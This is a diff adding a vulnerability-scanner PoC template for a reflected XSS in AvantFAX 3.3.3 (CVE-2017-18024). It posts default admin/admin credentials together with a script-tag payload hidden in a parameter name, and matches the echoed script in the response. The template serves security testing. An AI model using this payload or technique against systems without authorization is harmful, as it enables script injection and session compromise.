@@ -1,0 +1,49 @@
+[info]
+author = "ave"
+description = "检测 AvantFAX 3.3.3 默认 URI 中参数名反射型 XSS 漏洞，通过 POST 请求提交包含 Script 元素的参数名，验证响应中是否回显该脚本及 AvantFAX 特征"
+id = "POC-AVE-2017-0064"
+name = "AvantFAX 3.3.3 XSS PoC"
+severity = "medium"
+tags = ["ave-2017-0064"]
+vuln_id = [
+    "CVE-2017-18024",
+    "AVE-2017-0064",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = 'username=admin&password=admin&_submit_check=1&jlbqg<script>alert("ave")</script>b7g0x=1'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['<script>alert("ave")</script>']
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AvantFAX"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["text/html"]
